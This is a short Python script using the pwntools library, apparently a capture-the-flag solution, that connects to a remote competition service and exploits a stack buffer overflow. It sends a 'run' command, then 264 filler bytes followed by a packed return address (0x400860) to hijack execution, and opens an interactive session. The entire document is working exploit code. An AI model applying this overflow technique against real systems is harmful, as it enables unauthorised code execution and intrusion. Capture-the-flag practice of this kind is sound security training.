from pwn import *

#p = process("./console")
p = remote("buffer-overflow.ctfcompetition.com", 1337)

payload = p32(0x400860)

p.recv()
p.send("run\n")
p.recv(200)
p.send("A"*264 + payload + "\n")

p.interactive()
